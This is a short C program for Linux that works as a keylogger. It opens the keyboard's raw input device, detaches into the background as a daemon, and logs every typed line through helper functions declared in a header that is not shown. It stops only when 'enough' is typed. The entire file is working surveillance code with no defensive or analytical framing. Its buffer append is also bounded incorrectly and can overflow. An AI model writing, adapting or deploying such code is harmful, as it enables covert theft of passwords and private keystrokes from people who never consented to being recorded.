#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/input.h>
#include <string.h>

#include "functions.h"

int main(void)
{
	ssize_t nread;
    char buf[BUFSIZE] = {0};
	struct input_event ev;
	const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";

	int fd = open(dev, O_RDONLY);

    if (fd < 0) {
        perror("open()");
        return EXIT_FAILURE;
    }

    if (daemon(1, 1) < 0) {
        perror("daemon()");
        return EXIT_FAILURE;
    }

	while (strcmp(buf, "enough") != 0) {
		nread = read(fd, &ev, sizeof(ev));

		if (nread < 0) {
			if (errno == EINTR)
				continue;
			else
				break;
		} else if (nread != sizeof(ev)) {
			errno = EIO;
			break;
		}

		if (ev.type == EV_KEY && ev.value == 1)
			strncat(buf, convert_code(ev.code), BUFSIZE-1);

		if ((strlen(buf) == BUFSIZE-1) || ev.code == KEY_ENTER) {
            save_log(buf);
			memset(buf, 0, sizeof(buf));
		}
	}

	close(fd);

	return EXIT_SUCCESS;
}
